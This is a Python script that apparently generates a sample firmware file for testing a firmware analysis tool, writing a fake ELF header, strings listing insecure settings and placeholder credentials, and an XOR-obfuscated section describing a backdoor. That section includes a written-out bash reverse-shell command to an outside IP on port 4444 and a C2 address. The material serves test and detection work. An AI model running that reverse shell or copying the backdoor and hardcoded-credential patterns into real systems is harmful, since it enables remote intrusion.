"""
FirmwareX - Sample Firmware Generator
Creates a realistic sample firmware with an ELF header, plaintext vulnerabilities,
and an XOR-encrypted hidden payload.
"""
import struct
import os

output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sample_firmware.bin")

# ── ELF Header (52 bytes for 32-bit ELF) ──
elf_header = b"\x7fELF"          # Magic bytes
elf_header += b"\x01"             # 32-bit
elf_header += b"\x01"             # Little-endian
elf_header += b"\x01"             # ELF version
elf_header += b"\x00"             # OS/ABI
elf_header += b"\x00" * 8         # Padding
elf_header += struct.pack("<H", 2)  # Type: Executable
elf_header += struct.pack("<H", 3)  # Machine: x86 (EM_386)
elf_header += struct.pack("<I", 1)  # Version
elf_header += struct.pack("<I", 0x08048000)  # Entry point
elf_header += struct.pack("<I", 52)  # Program header offset
elf_header += struct.pack("<I", 0)   # Section header offset
elf_header += struct.pack("<I", 0)   # Flags
elf_header += struct.pack("<H", 52)  # ELF header size
elf_header += struct.pack("<H", 32)  # Program header entry size
elf_header += struct.pack("<H", 1)   # Number of program headers
elf_header += struct.pack("<H", 40)  # Section header entry size
elf_header += struct.pack("<H", 0)   # Number of section headers
elf_header += struct.pack("<H", 0)   # Section name string table index

# ── Plaintext Section (firmware code strings with vulnerabilities) ──
plaintext = b""
plaintext += b"[BOOT] FirmwareX IoT Device v2.4.1\n"
plaintext += b"[BOOT] Initializing hardware...\n"
plaintext += b"[BOOT] Loading configuration from /etc/firmware.conf\n"
plaintext += b"[WARN] Warning: use of strcpy() is deprecated and unsafe.\n"
plaintext += b"[WARN] sprintf() called without bounds checking.\n"
plaintext += b"[AUTH] Default admin password: admin/admin\n"
plaintext += b"[NET]  Connecting to hardcoded IP: 192.168.1.100\n"
plaintext += b"[NET]  Fallback server: 10.0.0.50:8080\n"
plaintext += b"[NET]  Using HTTP (unencrypted) for OTA updates\n"
plaintext += b"[CRED] AWS Key: AKIAIOSFODNN7EXAMPLE\n"
plaintext += b"[CRED] Private key: -----BEGIN RSA PRIVATE KEY-----\n"
plaintext += b"[CRED] API Token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"
plaintext += b"[CRED] DB Password: root:toor@localhost:3306/firmware_db\n"
plaintext += b"[VULN] gets() used for user input buffer\n"
plaintext += b"[VULN] system(\"/bin/sh\") called for debug mode\n"
plaintext += b"[CONF] telnet_enabled=true\n"
plaintext += b"[CONF] ssh_root_login=yes\n"
plaintext += b"[CONF] ssl_verify=false\n"
plaintext += b"[PATH] /etc/shadow accessible\n"
plaintext += b"[PATH] /root/.ssh/id_rsa loaded\n"
plaintext += b"\x00"

# ── XOR-Encrypted Hidden Payload ──
# This is the secret data that should only be visible after decryption
secret_payload  = b"[SECRET] TOP SECRET BACKDOOR PAYLOAD\n"
secret_payload += b"[SECRET] backdoor_shell enabled on port 1337\n"
secret_payload += b"[SECRET] Master password: Sup3rS3cr3t!@#\n"
secret_payload += b"[SECRET] C2 Server: 45.33.32.156:4444\n"
secret_payload += b"[SECRET] Reverse shell: /bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1\n"
secret_payload += b"[SECRET] JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U\n"
secret_payload += b"[SECRET] Encryption key: 0xDEADBEEFCAFEBABE\n"

xor_key = 0xAA
encrypted_payload = bytes(b ^ xor_key for b in secret_payload)

# ── Marker for encrypted section ──
enc_marker = b"\xDE\xAD\xBE\xEF"  # Magic marker before encrypted data

# ── Assemble firmware ──
firmware = bytearray()
firmware += elf_header              # 52 bytes
firmware += plaintext               # Variable
firmware += b"\x00" * 16           # Small gap
firmware += enc_marker              # 4-byte marker
firmware += struct.pack("<I", len(encrypted_payload))  # Length of encrypted section
firmware += encrypted_payload       # XOR 0xAA encrypted data

with open(output_file, "wb") as f:
    f.write(firmware)

print(f"[+] Sample firmware generated: {output_file}")
print(f"    Total size:       {len(firmware)} bytes")
print(f"    ELF header:       52 bytes")
print(f"    Plaintext:        {len(plaintext)} bytes")
print(f"    Encrypted data:   {len(encrypted_payload)} bytes (XOR key: 0x{xor_key:02X})")
print(f"    Encryption marker: DEADBEEF at offset 0x{52 + len(plaintext) + 16:04X}")
